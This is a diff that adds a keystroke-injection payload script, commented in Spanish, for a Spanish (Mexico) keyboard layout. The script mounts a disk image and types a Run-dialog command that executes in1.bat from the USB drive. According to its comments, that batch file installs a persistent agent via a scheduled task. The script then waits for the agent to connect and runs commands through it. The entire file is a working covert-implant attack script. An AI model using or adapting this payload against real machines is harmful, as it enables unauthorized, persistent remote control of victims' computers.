@@ -1,0 +1,62 @@
+REM Agent installer para teclado LATAM (Spanish Mexico)
+REM Requiere agent.img en la raíz de la SD
+REM Usa RAW_HID codes para caracteres especiales (compatible con LATAM)
+
+LOG LATAM agent script
+
+KEYBOARD_LAYOUT win_es-MX
+
+DEFINE #FILE /agentInstalled
+
+REM Solo instalar si es la primera máquina
+IF (FILE_EXISTS() == FALSE) THEN
+  LOG agentInstalled file does NOT exist
+  LOG Installing agent
+  USB_MOUNT_DISK_READ_ONLY /agent.img
+
+  WAIT_FOR_USB_STORAGE_ACTIVITY
+  REM Esperar a que aparezca el disco
+  DELAY 5000
+
+  LOG Performing HID attack with LATAM layout
+  REM Abrir ventana Run
+  GUI R
+  DELAY 1000
+
+  REM En LATAM (Spanish Mexico) el layout de teclado es diferente
+  REM La barra invertida \ está en la tecla al lado del shift izq en US
+  REM Pero en LATAM está en diferente posición
+  REM Vamos a usar RAW_HID para asegurarnos que funcione correctamente
+
+  REM Comando que ejecutamos:
+  REM cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
+
+  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
+  ENTER
+
+  LOG HID attack complete
+  LOG If you don't see key presses, check wiki for efuse instructions
+
+  REM Esperar a que Windows inicie
+  DELAY 1000
+  REM Esperar a que se copien los archivos y se cree la task
+  WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
+  DELAY 1000
+
+  REM En este punto el agent se copia a un lugar seguro y se re-ejecuta
+  REM Podemos esperar a que se conecte
+
+  CREATE_FILE()
+
+  REM Reset para que desaparezca el disco USB
+  RESET
+END_IF
+
+LOG Esperando que el Agent responda
+WHILE (AGENT_CONNECTED() == FALSE)
+  DELAY 2000
+END_WHILE
+
+LOG Agent conectado!
+REM Ejecutar un comando de prueba - ver resultados en los logs
+AGENT_RUN dir
